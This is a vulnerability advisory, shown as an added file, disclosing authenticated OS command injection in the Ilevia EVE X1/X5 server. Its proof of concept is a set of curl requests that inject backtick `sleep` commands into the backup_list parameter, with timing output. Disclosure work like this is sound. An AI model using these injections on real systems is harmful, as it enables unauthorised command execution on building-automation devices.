@@ -1,0 +1,94 @@
+
+Ilevia EVE X1/X5 Server 4.7.18.0.eden Authenticated Remote Command Injections
+
+
+Vendor: Ilevia Srl.
+Product web page: https://www.ilevia.com
+Affected version: <= 4.7.18.0.eden (Logic ver: 6.00)
+
+Summary: EVE is a smart home and building automation solution designed
+for both residential and commercial environments, including malls, hotels,
+restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+control and monitoring of electrical installations through a highly customizable,
+user-friendly interface.
+
+EVE is a multi-protocol platform that integrates various systems within
+a smart building to enhance comfort, security, safety, and energy efficiency.
+Users can manage building functions via iPhone, iPad, Android devices, Windows
+PCs, or Mac computers.
+
+The EVE X1 Server is the dedicated hardware solution for advanced building
+automation needs. Compact and powerful, it is ideal for apartments, small
+to medium-sized homes, and smaller commercial installations. It is designed
+to manage entire automation systems reliably and efficiently.
+
+Desc: The EVE X1/X5 server suffers from multiple authenticated OS command
+injection vulnerabilities. This can be exploited to inject and execute arbitrary
+shell commands through multiple scripts affecting multiple parameters.
+
+Tested on: GNU/Linux 5.4.35 (armv7l)
+           GNU/Linux 4.19.97 (armv7l)
+           Armbian 20.02.1 Buster
+           Apache/2.4.38 (Debian)
+           PHP Version 7.3.14
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5966
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5966.php
+CVE ID: CVE-2025-34514
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2025-34514
+
+
+01.05.2024
+
+--
+
+
+$ curl "http://ilevia:8080/utilities/restore_backup.php" \
+> -d "restore_backup=ZSL&backup_list=t00t`sleep 2`" \
+> -H "Cookie: PHPSESSID=zmq7c0yo2n1vdff42koer2rh7o" \
+> -w "@vreme_meri_uspeh.txt" \
+> -o NUL \
+> -s
+         Name lookup:  0.000053s
+             Connect:  0.051050s
+         App connect:  0.000000s
+        Pre-transfer:  0.051222s
+            Redirect:  0.000000s
+      Start transfer:  2.319996s
+                       ---------
+               Total:  2.320221s
+
+$ curl "http://ilevia:8080/utilities/restore_backup.php" \
+> -d "restore_backup=ZSL&backup_list=t00t`sleep 5`" \
+> -H "Cookie: PHPSESSID=zmq7c0yo2n1vdff42koer2rh7o" \
+> -w "@vreme_meri_uspeh.txt" \
+> -o NUL \
+> -s
+         Name lookup:  0.000036s
+             Connect:  0.054033s
+         App connect:  0.000000s
+        Pre-transfer:  0.054202s
+            Redirect:  0.000000s
+      Start transfer:  5.405840s
+                       ---------
+               Total:  5.406058s
+
+$ curl "http://ilevia:8080/utilities/restore_backup.php" \
+> -d "restore_backup=ZSL&backup_list=t00t`sleep 17`" \
+> -H "Cookie: PHPSESSID=zmq7c0yo2n1vdff42koer2rh7o" \
+> -w "@vreme_meri_uspeh.txt" \
+> -o NUL \
+> -s
+         Name lookup:  0.000034s
+             Connect:  0.054883s
+         App connect:  0.000000s
+        Pre-transfer:  0.055202s
+            Redirect:  0.000000s
+      Start transfer:  17.314388s
+                       ---------
+               Total:  17.314604s
